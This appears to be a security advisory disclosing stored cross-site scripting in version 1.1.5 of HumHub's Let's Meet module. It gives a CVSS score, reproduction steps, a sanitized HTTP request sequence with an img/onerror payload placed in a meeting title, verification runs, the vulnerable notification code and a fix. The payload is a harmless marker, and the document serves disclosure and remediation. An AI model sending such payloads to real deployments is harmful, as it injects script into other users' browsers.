# HumHub Let's Meet invitation notification stored XSS

## Summary

HumHub Let's Meet 1.1.5 contains stored cross-site scripting in invitation notifications. NewInviteNotification interpolates the meeting title, organizer display name, and space name into raw HTML without encoding. A user permitted to create meetings can inject markup that executes when an invited user opens the notification overview.

## Affected product

- Vendor/project: **HumHub**
- Product: **Let's Meet module**
- Affected version: **1.1.5**
- Weakness: **CWE-79**
- CVSS 3.1: `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N (5.4)`
- Verification: **STABLE — 3/3 consecutive fresh runs**

## Researcher

- **Zhong Guangyuan (钟广源), Fudan University**

## Attack prerequisites and impact

User permitted to create a meeting and invite the victim; victim opens notifications.

Verified flow: `meeting title / display names → NewInviteNotification::html() → notification overview`

Successful exploitation permits attacker-controlled markup or script to execute in another user's browser in the affected application origin. The exact privilege and interaction requirements are reflected in the CVSS vector above.

## Reproduction

1. Create a meeting whose title contains an HTML marker and invite another user.
2. Run the normal notification queue processing path.
3. Open the invited user's notification overview and inspect the rendered notification.

Sanitized request shape used during verification:

```http
# User permitted to create meetings; CSRF/state identifiers redacted
POST <BASE_URL>/s/<SPACE_ID>/lets-meet/index/create
Cookie: <ATTACKER_SESSION_COOKIE>
X-CSRF-Token: <CSRF>
X-Requested-With: XMLHttpRequest

MainForm[title]=<img id=gt481023h5c src=x onerror=self.x=5>
MainForm[description]=gt481023h5c meeting
MainForm[duration]=01:00&MainForm[make_public]=1

POST .../lets-meet/index/dates?hash=<STATE_HASH>
POST .../lets-meet/index/invites?hash=<STATE_HASH>
InvitesForm[invites][]=<VICTIM_GUID>

GET <BASE_URL>/notification/overview
```

Authentication values, private host/IP values, internal identifiers, CSRF values, document keys and one-time tokens are redacted. Parameter names, affected endpoints and payload structure are retained.

## Fresh verification evidence

| Run | Marker | Observation | Result |
| --- | --- | --- | --- |
| 1 | `gt481023h5a` | HTTP 200; raw_hit=true | **PASS** |
| 2 | `gt481023h5b` | HTTP 200; raw_hit=true | **PASS** |
| 3 | `gt481023h5c` | HTTP 200; raw_hit=true | **PASS** |

```text
Saved notification response, run 3:
<strong>Gt48 gt481023h5c</strong> invites you to vote on
<strong><img id=gt481023h5c src=x onerror=self.x=5></strong>
Let's Meet in the Space <strong>Project Workspace</strong>.

status: 200
raw_hit: true
Meeting title was confirmed in storage during the run.
```

The evidence was generated from a researcher-controlled test deployment. Test records were cleaned after verification.

## Confirmed source and Sink

```text
NewInviteNotification.php:48-54
public function html() {
    return Yii::t(..., [
        'organizer' => $this->originator->displayName,
        'meeting' => $this->source->title,
        'space' => $this->source->content->container->name,
    ]);
}
```

Root cause: The notification's HTML translation receives attacker-controlled meeting and display values as trusted substitutions, producing raw notification markup.

## Recommended remediation

HTML-encode every substituted value before building the HTML notification, or render the notification with safe components rather than a translated HTML string.

## References

- Official source: https://github.com/humhub/lets-meet/blob/master/notifications/NewInviteNotification.php

## Evidence images

The three public evidence images show, in order:

1. The sanitized reproduction request, endpoint, parameter and payload structure.
2. The three consecutive successful verification runs and exact response/DOM/database excerpts.
3. The highlighted attacker-controlled source and unsafe rendering Sink.

The images are public-safe renderings produced from saved raw HTTP/DOM/database evidence; they are not represented as live browser screenshots.

### Sanitized reproduction

![CAN-18 sanitized reproduction](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-18/01-reproduction.png)

### Three-run success proof

![CAN-18 three-run success proof](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-18/02-success-proof.png)

### Source-to-Sink evidence

![CAN-18 source-to-Sink evidence](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-18/03-source-sink.png)
